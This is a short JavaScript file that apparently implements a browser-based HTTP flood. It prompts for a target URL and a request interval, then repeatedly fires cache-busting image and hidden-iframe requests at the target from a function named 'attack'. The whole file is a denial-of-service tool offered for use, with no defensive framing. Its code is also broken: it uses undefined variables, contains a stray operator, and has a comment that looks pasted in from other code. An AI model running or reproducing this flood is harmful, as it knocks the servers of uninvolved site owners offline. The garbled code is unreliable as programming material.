var target = prompt("Image Url, add / to the end");
var speed = prompt("Make request ever [blank] miliseconds");
var msg = prompt("Message to HTTP server");

function attack() {  
  var pic = new Image();
  var rand1 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  var rand2 = Math.floor(Math.random() * 99999999999999999999999999999999999999999999);
  pic.src = 'http://'+target+"/?r="+rand;
    
    document.body.innerHTML+='<iframe src='+target+'?daKillaOfZeeCache="'+rand1+ +' &msg= '+ msg + '"style="display:none;"></iframe>';
  

                    img.onload = function () { onSuccess(rID); }; // TODO: it may never happen if target URL is not an image... // but probably can be fixed with different methods
					img.setAttribute("src", targetURL + "?killinAllThatCacheYeah=" + rand2 + "&msg=" + msg);

}
setInterval(attack, speed);  
